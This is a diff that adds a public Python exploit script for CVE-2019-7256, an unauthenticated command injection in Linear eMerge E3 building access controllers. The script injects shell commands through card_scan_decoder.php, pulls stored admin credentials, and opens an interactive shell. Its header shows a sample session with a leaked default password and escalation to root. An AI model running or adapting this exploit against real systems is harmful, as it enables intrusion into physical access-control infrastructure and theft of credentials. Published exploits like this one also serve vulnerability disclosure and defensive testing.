@@ -1,0 +1,116 @@
+# Title: Linear eMerge E3 1.00-06 - Remote Code Execution
+# Author: LiquidWorm
+# Date: 2019-11-13
+# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
+# Software Link: http://linear-solutions.com/nsc_family/e3-series/
+# Affected version: <=2.3.0a
+# Advisory: https://applied-risk.com/resources/ar-2019-005
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# CVE: CVE-2019-7256
+
+#!/usr/bin/env python
+#
+# Linear eMerge E3 Unauthenticated Command Injection Remote Root Exploit
+# Affected version: <=1.00-06
+# via card_scan_decoder.php
+# CVE: CVE-2019-7256
+# Advisory: https://applied-risk.com/resources/ar-2019-005
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+#
+# By Gjoko 'LiquidWorm' Krstic
+#
+#########################################################################
+# lqwrm@metalgear:~/stuff$ python emergeroot2.py 192.168.1.2
+# Do you want me to try and get the web front-end credentials? (y/n) y
+# ID='admin',Password='MakeLoveNotWar!'
+#
+# lighttpd@192.168.1.2:/spider/web/webroot$ id
+# uid=1003(lighttpd) gid=0(root)
+#
+# lighttpd@192.168.1.2:/spider/web/webroot$ cat /etc/version
+# Software Version: 1.00.03
+# Image: nxgcpub-image
+# Built by: jenkins
+#
+# lighttpd@192.168.1.2:/spider/web/webroot$ echo davestyle |su -c id
+# Password: 
+# uid=0(root) gid=0(root) groups=0(root)
+#
+# lighttpd@192.168.1.2:/spider/web/webroot$ exit
+#
+# [+] Erasing read stage file and exiting...
+# [+] Done. Ba-bye!
+#
+#########################################################################
+
+import requests
+import time####
+import sys#####
+import os######
+import re######
+
+piton = os.path.basename(sys.argv[0])
+
+if len(sys.argv) < 2:
+	print '''
+                                         .....                              
+                                    .e$$$$$$$$$$$$$$e.                      
+                                  z$$ ^$$$$$$$$$$$$$$$$$.                   
+                                .$$$* J$$$$$$$$$$$$$$$$$$$e                 
+                               .$"  .$$$$$$$$$$$$$$$$$$$$$$*-               
+                              .$  $$$$$$$$$$$$$$$$***$$  .ee"               
+                 z**$$        $$r ^**$$$$$$$$$*" .e$$$$$$*"                 
+                " -\e$$      4$$$$.         .ze$$$""""                      
+               4 z$$$$$      $$$$$$$$$$$$$$$$$$$$"                          
+               $$$$$$$$     .$$$$$$$$$$$**$$$$*"                            
+             z$$"    $$     $$$$P*""     J$*$$c                             
+            $$"      $$F   .$$$          $$ ^$$                             
+           $$        *$$c.z$$$          $$   $$                             
+          $P          $$$$$$$          4$F   4$                             
+         dP            *$$$"           $$    '$r                            
+        .$                            J$"     $"                            
+        $                             $P     4$                             
+        F                            $$      4$                             
+                                    4$%      4$                             
+                                    $$       4$                             
+                                   d$"       $$                             
+                                   $P        $$                             
+                                  $$         $$                             
+                                 4$%         $$                             
+                                 $$          $$                             
+                                d$           $$                             
+                                $F           "3                             
+                         r=4e="  ...  ..rf   .  ""%                         
+                        $**$*"^""=..^4*=4=^""  ^"""
+  '''
+	print '\n\x20\x20[+] Linear eMerge E3 Remote Root Exploit'
+	print '\x20\x20[-] by lqwrm (c) 2019'
+	print '\n\x20\x20[*] Usage: '+piton+' <ipaddress:port>\n'
+	sys.exit()
+
+ipaddr = sys.argv[1]
+
+creds = raw_input('Do you want me to try and get the web front-end credentials? (y/n) ')
+if creds.strip() == 'y':
+    frontend = '''grep "Controller" /tmp/SpiderDB/Spider.db |cut -f 5,6 -d ',' |grep ID'''
+    requests.get('http://'+ipaddr+'/card_scan_decoder.php?No=30&door=%60'+frontend+' > test.txt%60')
+    showme = requests.get('http://'+ipaddr+'/test.txt')
+    print showme.text
+
+while True:
+	try:
+		cmd = raw_input('lighttpd@'+ipaddr+':/spider/web/webroot$ ')
+		execute = requests.get('http://'+ipaddr+'/card_scan_decoder.php?No=30&door=%60'+cmd+' > test.txt%60')
+		#time.sleep(1);
+		readreq = requests.get('http://'+ipaddr+'/test.txt')
+		print readreq.text
+		if cmd.strip() == 'exit':
+			print "[+] Erasing read stage file and exiting..."
+			requests.get('http://'+ipaddr+'/card_scan_decoder.php?No=30&ReaderNo=%60rm test.txt%60')
+			print "[+] Done. Ba-bye!\n"
+			break
+		else: continue
+	except Exception:
+		break
+
+sys.exit()
